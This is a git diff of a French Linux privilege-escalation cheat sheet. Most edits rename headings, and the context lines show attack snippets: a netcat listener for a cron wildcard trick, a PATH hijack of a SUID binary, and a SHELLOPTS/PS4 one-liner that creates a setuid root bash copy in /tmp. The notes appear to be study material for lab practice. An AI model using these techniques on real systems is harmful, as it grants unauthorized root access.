@@ -7,10 +7,12 @@ Des techniques pour de la PrivEsc sur linux !
 - [NFS](#NFS)
 - [Environment Variables](#Environment-Variables)
 - [Apache2 & LD_LIBRARY_PATH](#Apache2-&-LD_LIBRARY_PATH)
-- [Cron Jobs PATH Environment Variable](#Cron-Jobs-PATH-Environment-Variable)
-- [Cron Jobs Wildcard](#Cron-Jobs-Wildcard)
-- [Executables Shared Object Injection](#Executables-Shared-Object-Injection)
+- [Cron Jobs - PATH Environment Variable](#Cron-Jobs---PATH-Environment-Variable)
+- [Cron Jobs - Wildcard](#Cron-Jobs---Wildcard)
+- [Executables - Shared Object Injection](#Executables---Shared-Object-Injection)
 - [Executables - Environment Variables ](#Executables---Environment-Variables)
+- [Executables - Abusing Shell Features (#1)](#Executables---Abusing-Shell-Features-(#1))
+- [Executables - Abusing Shell Features (#2)](#Executables---Abusing-Shell-Features-(#2))
 
 ## Commande find
 
@@ -173,7 +175,7 @@ void hijack() {
 <br>
 <br>
 
-## Cron Jobs PATH Environment Variable
+## Cron Jobs - PATH Environment Variable
 
 Exemple
 ```
@@ -216,7 +218,7 @@ puis
 <br>
 <br>
 
-## Cron Jobs Wildcard
+## Cron Jobs - Wildcard
 
 Cas de `tar` (Cf. Crontab au dessus)
 
@@ -250,7 +252,7 @@ nc -lnvp 1337
 <br>
 <br>
 
-## Executables Shared Object Injection
+## Executables - Shared Object Injection
 
 Utiliser stracer pour voir les appels au objet partagé !
 
@@ -296,7 +298,7 @@ PATH=.:$PATH /usr/local/bin/suid-env
 <br>
 <br>
 
-## SUID / SGID Executables - Abusing Shell Features (#1) 
+## Executables - Abusing Shell Features (#1) 
 
 ```
 user@debian:~$ strings /usr/local/bin/suid-env2
@@ -339,7 +341,7 @@ export -f /usr/sbin/service
 <br>
 <br>
 
-## SUID / SGID Executables - Abusing Shell Features (#2)
+## Executables - Abusing Shell Features (#2)
 
 ```
 env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
